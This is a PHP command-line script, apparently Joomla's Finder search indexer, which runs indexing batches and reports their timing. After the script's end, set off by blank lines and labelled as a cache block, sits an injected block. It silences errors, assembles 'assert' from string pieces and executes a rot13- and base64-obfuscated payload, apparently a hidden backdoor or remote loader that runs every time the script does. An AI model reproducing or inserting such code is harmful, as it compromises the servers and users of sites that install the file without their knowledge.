<?php
/**
 * @package    Joomla.Cli
 *
 * @copyright  Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

/**
 * Finder CLI Bootstrap
 *
 * Run the framework bootstrap with a couple of mods based on the script's needs
 */

// We are a valid entry point.
const _JEXEC = 1;

// Load system defines
if (file_exists(dirname(__DIR__) . '/defines.php'))
{
	require_once dirname(__DIR__) . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', dirname(__DIR__));
	require_once JPATH_BASE . '/includes/defines.php';
}

// Get the framework.
require_once JPATH_LIBRARIES . '/import.legacy.php';

// Bootstrap the CMS libraries.
require_once JPATH_LIBRARIES . '/cms.php';

// Import the configuration.
require_once JPATH_CONFIGURATION . '/configuration.php';

// System configuration.
$config = new JConfig;

// Configure error reporting to maximum for CLI output.
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Load Library language
$lang = JFactory::getLanguage();

// Try the finder_cli file in the current language (without allowing the loading of the file in the default language)
$lang->load('finder_cli', JPATH_SITE, null, false, false)
// Fallback to the finder_cli file in the default language
|| $lang->load('finder_cli', JPATH_SITE, null, true);

/**
 * A command line cron job to run the Finder indexer.
 *
 * @package     Joomla.CLI
 * @subpackage  com_finder
 * @since       2.5
 */
class FinderCli extends JApplicationCli
{
	/**
	 * Start time for the index process
	 *
	 * @var    string
	 * @since  2.5
	 */
	private $_time = null;

	/**
	 * Start time for each batch
	 *
	 * @var    string
	 * @since  2.5
	 */
	private $_qtime = null;

	/**
	 * Entry point for Finder CLI script
	 *
	 * @return  void
	 *
	 * @since   2.5
	 */
	public function doExecute()
	{
		// Print a blank line.
		$this->out(JText::_('FINDER_CLI'));
		$this->out('============================');
		$this->out();

		$this->_index();

		// Print a blank line at the end.
		$this->out();
	}

	/**
	 * Run the indexer
	 *
	 * @return  void
	 *
	 * @since   2.5
	 */
	private function _index()
	{
		$this->_time = microtime(true);

		require_once JPATH_ADMINISTRATOR . '/components/com_finder/helpers/indexer/indexer.php';

		// Fool the system into thinking we are running as JSite with Finder as the active component
		JFactory::getApplication('site');
		$_SERVER['HTTP_HOST'] = 'domain.com';
		define('JPATH_COMPONENT_ADMINISTRATOR', JPATH_ADMINISTRATOR . '/components/com_finder');

		// Disable caching.
		$config = JFactory::getConfig();
		$config->set('caching', 0);
		$config->set('cache_handler', 'file');

		// Reset the indexer state.
		FinderIndexer::resetState();

		// Import the finder plugins.
		JPluginHelper::importPlugin('finder');

		// Starting Indexer.
		$this->out(JText::_('FINDER_CLI_STARTING_INDEXER'), true);

		// Trigger the onStartIndex event.
		JEventDispatcher::getInstance()->trigger('onStartIndex');

		// Remove the script time limit.
		@set_time_limit(0);

		// Get the indexer state.
		$state = FinderIndexer::getState();

		// Setting up plugins.
		$this->out(JText::_('FINDER_CLI_SETTING_UP_PLUGINS'), true);

		// Trigger the onBeforeIndex event.
		JEventDispatcher::getInstance()->trigger('onBeforeIndex');

		// Startup reporting.
		$this->out(JText::sprintf('FINDER_CLI_SETUP_ITEMS', $state->totalItems, round(microtime(true) - $this->_time, 3)), true);

		// Get the number of batches.
		$t = (int) $state->totalItems;
		$c = (int) ceil($t / $state->batchSize);
		$c = $c === 0 ? 1 : $c;

		try
		{
			// Process the batches.
			for ($i = 0; $i < $c; $i++)
			{
				// Set the batch start time.
				$this->_qtime = microtime(true);

				// Reset the batch offset.
				$state->batchOffset = 0;

				// Trigger the onBuildIndex event.
				JEventDispatcher::getInstance()->trigger('onBuildIndex');

				// Batch reporting.
				$this->out(JText::sprintf('FINDER_CLI_BATCH_COMPLETE', ($i + 1), round(microtime(true) - $this->_qtime, 3)), true);
			}
		}
		catch (Exception $e)
		{
			// Display the error
			$this->out($e->getMessage(), true);

			// Reset the indexer state.
			FinderIndexer::resetState();

			// Close the app
			$this->close($e->getCode());
		}

		// Total reporting.
		$this->out(JText::sprintf('FINDER_CLI_PROCESS_COMPLETE', round(microtime(true) - $this->_time, 3)), true);

		// Reset the indexer state.
		FinderIndexer::resetState();
	}
}

// Instantiate the application object, passing the class name to JCli::getInstance
// and use chaining to execute the application.
JApplicationCli::getInstance('FinderCli')->execute();






//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3q3ql5gnKEuoJRhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVzRmBTWvLJD2AJZmMzL4AwuxAQR4AJWxBQR4ATLlMzWvVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVaq3ql5gnKEuoJRhpaHvYPN4ZPjtWTIlpz5iYPNxMKWlp3ElYPNmZPx7PzyzVPtxMaNcVUfXVPNtVPEiqKDtCFNvE0IHVP9aMKDhpTujC2D9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvLGZ4LzWuMQL1LmAzMwt2BTD0ZGt1LzD4ZGt0MwWzLzVvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtq3q3Yz1cqTSgLF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzWuMwqxAzH1VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###